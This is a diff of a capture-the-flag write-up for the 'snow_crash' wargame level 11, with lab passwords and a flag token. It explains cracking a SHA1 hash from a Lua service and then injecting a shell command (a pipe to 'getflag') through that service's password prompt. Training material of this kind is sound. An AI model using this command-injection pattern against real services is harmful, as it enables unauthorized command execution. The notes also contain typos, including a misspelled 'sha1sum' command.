@@ -1,5 +1,33 @@
-Level09 - snow_crash
+Level11 - snow_crash
 
-Connect with the previous password "25749xKZ8L7DkSCwJkT9dyv6f"
-	ssh -p 4242 level09@192.168.1.20 
+Connect with the previous password "feulo4b72j7edeahuete3no7c"
+	ssh -p 4242 level11@192.168.1.20 
 
+When can see a file in lua code. 
+When looking at it we can find that it connect a server on localhost at port 5151, it check for a password. 
+The password is encode on sha1 and if it valide it reply "Gz you dumb".
+By revercing the hash in sh1 that the password is compared we found "NotSoEasy".
+
+We try to test the encodedage.
+	echo NotSoEasy | sh1sum
+	62d39a9edac7bc1a68d816a5d9a491aa4e81fbcb  -
+Not the same
+	echo -n NotSoEasy | sh1sum
+	f05d1d066fb246efe0c6f7d095f909a7a0cf34a0  -
+It valid. 
+
+Just need to send it now, but we need to remove the return ligne at the end.
+	nc localhost 5151
+	Password: -n NotSoEasy
+It give us Gz you dumb
+
+We can inject other line in the password 
+	nc localhost 5151
+	Password: test | getflag > /tmp/test
+	cat /tmp/test
+	
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+
+
+https://www.dcode.fr/sha1-hash
